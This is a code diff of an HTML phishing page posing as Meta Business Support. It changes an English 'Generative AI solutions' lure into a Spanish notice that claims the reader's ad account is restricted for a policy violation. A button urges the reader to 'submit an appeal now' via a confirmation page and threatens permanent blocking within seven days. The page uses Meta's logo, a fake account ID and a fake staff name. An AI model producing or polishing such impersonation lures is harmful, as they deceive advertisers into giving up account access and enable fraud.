@@ -1,139 +1,259 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="es">
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Meta Business Support - Generative AI Solutions</title>
+  <title>Soporte Empresarial de Meta - Notificación de Incumplimiento de Políticas</title>
   <style>
+    * {
+      box-sizing: border-box;
+    }
+    
     body {
       margin: 0;
-      font-family: Arial, sans-serif;
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
       background-color: #f0f2f5;
       display: flex;
       justify-content: center;
       align-items: center;
       min-height: 100vh;
-      padding: 20px;
+      padding: 10px;
+      line-height: 1.6;
     }
+    
     .container {
       background-color: white;
       max-width: 650px;
       width: 100%;
-      padding: 30px;
-      border-radius: 10px;
-      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+      padding: 25px;
+      border-radius: 12px;
+      box-shadow: 0 8px 32px rgba(0, 0, 0, 0.1);
+      margin: 10px auto;
     }
+    
     .meta-logo {
-      width: 50px;
+      width: 60px;
       display: block;
       margin: 0 auto 20px auto;
+      max-width: 100%;
+      height: auto;
     }
+    
     .title {
-      font-size: 22px;
-      font-weight: bold;
+      font-size: clamp(20px, 4vw, 24px);
+      font-weight: 700;
       text-align: center;
-      margin-bottom: 10px;
+      margin-bottom: 8px;
+      color: #1c1e21;
     }
+    
     .subtitle {
       text-align: center;
-      font-size: 16px;
-      color: #555;
+      font-size: clamp(14px, 3vw, 16px);
+      color: #65676b;
       margin-bottom: 25px;
+      word-break: break-word;
     }
+    
     .section {
-      margin-bottom: 20px;
+      margin-bottom: 24px;
     }
+    
     .section h3 {
       color: #1877f2;
-      font-size: 18px;
-      margin-bottom: 10px;
+      font-size: clamp(16px, 3.5vw, 18px);
+      margin-bottom: 12px;
+      font-weight: 600;
     }
+    
     .section p {
-      font-size: 16px;
-      color: #333;
-      margin: 5px 0;
-      line-height: 1.5;
+      font-size: clamp(14px, 3vw, 16px);
+      color: #1c1e21;
+      margin: 8px 0;
+      line-height: 1.6;
     }
+    
     .button {
-      display: inline-block;
-      background-color: #1877f2;
+      display: block;
+      background: linear-gradient(135deg, #1877f2 0%, #1a91ff 100%);
       color: white;
-      padding: 12px 24px;
+      padding: clamp(14px, 4vw, 16px) clamp(20px, 5vw, 30px);
       border: none;
-      border-radius: 6px;
-      font-size: 16px;
+      border-radius: 8px;
+      font-size: clamp(16px, 4vw, 18px);
+      font-weight: 600;
       cursor: pointer;
       text-decoration: none;
       text-align: center;
       width: 100%;
-      margin-top: 15px;
+      max-width: 100%;
+      margin: 20px auto 0;
+      transition: all 0.3s ease;
+      box-shadow: 0 4px 12px rgba(24, 119, 242, 0.3);
     }
+    
+    .button:hover {
+      background: linear-gradient(135deg, #166fe5 0%, #1a85e5 100%);
+      transform: translateY(-2px);
+      box-shadow: 0 6px 20px rgba(24, 119, 242, 0.4);
+    }
+    
+    .button:active {
+      transform: translateY(0);
+      box-shadow: 0 2px 8px rgba(24, 119, 242, 0.3);
+    }
+    
     .footer {
-      font-size: 14px;
-      color: #888;
+      font-size: clamp(12px, 2.5vw, 14px);
+      color: #65676b;
       text-align: center;
       margin-top: 30px;
       line-height: 1.6;
     }
-    @media (max-width: 600px) {
+    
+    .footer p {
+      margin: 8px 0;
+    }
+    
+    .warning-text {
+      background-color: #fef7e0;
+      border: 1px solid #f5c15c;
+      border-radius: 6px;
+      padding: 12px;
+      margin: 16px 0;
+      color: #8a5f00;
+    }
+    
+    /* Tablet styles */
+    @media (max-width: 768px) {
+      body {
+        padding: 15px;
+        align-items: flex-start;
+        min-height: 100vh;
+      }
+      
+      .container {
+        padding: 20px;
+        margin: 0;
+        border-radius: 8px;
+        box-shadow: 0 4px 16px rgba(0, 0, 0, 0.08);
+      }
+      
       .title {
-        font-size: 20px;
+        margin-bottom: 12px;
       }
-      .section p, .section h3 {
-        font-size: 15px;
+      
+      .section {
+        margin-bottom: 20px;
       }
+      
       .button {
-        padding: 14px;
+        margin-top: 16px;
+        padding: 16px 20px;
+      }
+    }
+    
+    /* Mobile styles */
+    @media (max-width: 480px) {
+      body {
+        padding: 8px;
+      }
+      
+      .container {
+        padding: 16px;
+        border-radius: 6px;
+      }
+      
+      .meta-logo {
+        width: 50px;
+        margin-bottom: 16px;
+      }
+      
+      .subtitle {
+        margin-bottom: 20px;
+      }
+      
+      .section p {
+        margin: 6px 0;
+      }
+      
+      .footer {
+        margin-top: 24px;
+      }
+      
+      .footer p {
+        margin: 6px 0;
+        font-size: 12px;
+      }
+    }
+    
+    /* Very small screens */
+    @media (max-width: 360px) {
+      .container {
+        padding: 12px;
+      }
+      
+      .button {
+        font-size: 16px;
+        padding: 14px 16px;
+      }
+    }
+    
+    /* Landscape mobile */
+    @media (max-height: 500px) and (orientation: landscape) {
+      body {
+        align-items: flex-start;
+        padding: 10px;
+      }
+      
+      .container {
+        margin: 10px auto;
+        max-height: 90vh;
+        overflow-y: auto;
       }
     }
   </style>
 </head>
 <body>
   <div class="container">
-    <img src="https://brandlogos.net/wp-content/uploads/2021/10/meta_platforms_icon-logo_brandlogos.net_f5zqr.png" alt="Meta Logo" class="meta-logo">
+    <img src="https://brandlogos.net/wp-content/uploads/2021/10/meta_platforms_icon-logo_brandlogos.net_f5zqr.png" alt="Logo de Meta" class="meta-logo">
     
-    <div class="title">Meta Business Support</div>
-    <div class="subtitle">Ad Account ID: <strong>1526951525132026</strong></div>
+    <div class="title">Soporte Empresarial de Meta</div>
+    <div class="subtitle">ID de Cuenta Publicitaria: <strong>1526951525132026</strong></div>
 
     <div class="section">
-      <p>Dear <strong>Advertiser</strong>,</p>
-      <p>I'm <strong>Forrest</strong>, a lead generation advertising specialist at <strong>Meta</strong>. I’ve noticed that your ad account is now eligible to access our latest <strong>Generative AI solutions</strong> for <strong>Advantage+ creative tools</strong>.</p>
-      <p>These tools are designed to help you save time while producing engaging ads — allowing you to maintain brand consistency, generate ad copy, expand videos, and more.</p>
+      <p>Estimado <strong>Anunciante</strong>,</p>
+      <p>Soy <strong>Forrest</strong>, especialista en publicidad de <strong>Meta</strong>. Lamentamos informarle que su cuenta publicitaria ha sido <strong>restringida temporalmente</strong> debido a un incumplimiento de las <strong>Políticas de Publicidad de Meta</strong>.</p>
+      <div class="warning-text">
+        <strong>Advertencia:</strong> El contenido publicitario reciente que promocionaba <strong>producto de crecimiento rápido no autorizado</strong> infringe nuestras normas sobre contenido prohibido.
+      </div>
     </div>
 
     <div class="section">
-      <h3>3 Generative AI Solutions for More Effective Ads</h3>
-      <p>These AI-powered tools leverage automation to help you create personalized, scalable, and impactful ad content. To begin, simply enable each feature while creating ads in the <strong>Meta Ads Manager</strong>.</p>
+      <h3>🔍 Motivo de la Restricción de la Cuenta</h3>
+      <p>Sus anuncios contienen afirmaciones no verificadas sobre un rápido crecimiento de ingresos a través de soluciones de IA no autorizadas. Esto infringe las políticas de Meta sobre publicidad honesta y transparente.</p>
     </div>
 
     <div class="section">
-      <h3>1. Brand Identity Builder</h3>
-      <p>Allow our system to automatically apply your brand elements (such as color, logo, and font) to ad content — ensuring consistent brand identity across all campaigns.</p>
+      <h3>✅ Cómo Resolverlo</h3>
+      <p>Para restaurar su cuenta, debe <strong>presentar una apelación</strong> de inmediato. Haga clic en el botón de abajo para iniciar el proceso de revisión y proporcionar información que demuestre que su contenido cumple con las políticas de Meta.</p>
     </div>
 
-    <div class="section">
-      <h3>2. Text Generation</h3>
-      <p>Generate multiple high-quality versions of ad text tailored to different customer segments, helping you diversify and personalize your creative messaging.</p>
-    </div>
+    <a href="/confirm.html" class="button">🚨 Enviar Apelación Ahora</a>
 
     <div class="section">
-      <h3>3. Video Expansion</h3>
-      <p>Seamlessly expand video aspect ratios to <strong>9:16</strong> for a more immersive experience on <strong>Reels</strong>. Ads with 9:16 videos have been shown to reduce cost per action compared to other formats<sup>1</sup>.</p>
-    </div>
-
-    <a href="/confirm.html" class="button">Explore AI Solutions</a>
-
-    <div class="section">
-      <p><strong>Start your journey with Generative AI.</strong></p>
-      <p>Discover how easy it is to activate the latest <strong>Advantage+</strong> creative automation tools to optimize your ad campaigns.</p>
+      <p><strong>⚠️ Plazo Importante:</strong></p>
+      <p>Si no presenta una apelación dentro de los próximos <strong>7 días</strong>, su cuenta podría ser <strong>bloqueada permanentemente</strong>. ¡Actúe ahora para evitar interrupciones en su negocio!</p>
     </div>
 
     <div class="footer">
-      <p>Thank you!<br><strong>Forrest</strong><br>Marketing Manager at Meta</p>
-      <p style="margin-top:15px; font-size:13px;">
-        <em>¹ Based on aggregated global analysis of 15 A/B tests across Reels-only campaigns, where advertisers compared static images versus 9:16 video formats with sound and safe-zone alignment. Method proven effective with 99.9% reliability.</em>
+      <p>¡Gracias por su cooperación!<br>
+      <strong>Forrest</strong><br>
+      Gerente de Políticas de Publicidad en Meta</p>
+      <p style="font-size: 0.85em; margin-top: 12px;">
+        <em>Meta está comprometida con mantener un entorno publicitario seguro y transparente para todos los usuarios.</em>
       </p>
-      <p>Meta Terms of Service © <script>document.write(new Date().getFullYear());</script></p>
+      <p>Términos de Servicio de Meta © <script>document.write(new Date().getFullYear());</script></p>
     </div>
   </div>
 </body>
